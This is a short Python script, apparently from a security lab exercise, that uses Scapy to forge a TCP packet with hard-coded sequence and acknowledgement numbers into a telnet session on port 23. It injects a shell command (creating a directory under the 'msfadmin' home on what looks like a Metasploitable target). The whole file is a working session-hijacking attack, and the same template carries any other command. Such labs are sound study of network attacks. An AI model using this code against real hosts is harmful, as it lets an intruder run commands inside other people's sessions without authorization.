#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.194", dst = "10.10.10.195")
TCPLayer = TCP (sport=60520, dport=23, flags="A", seq=2830774205, ack=3891207049)

data = "\n mkdir /home/msfadmin/attacker \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)

send(pkt,verbose=0)
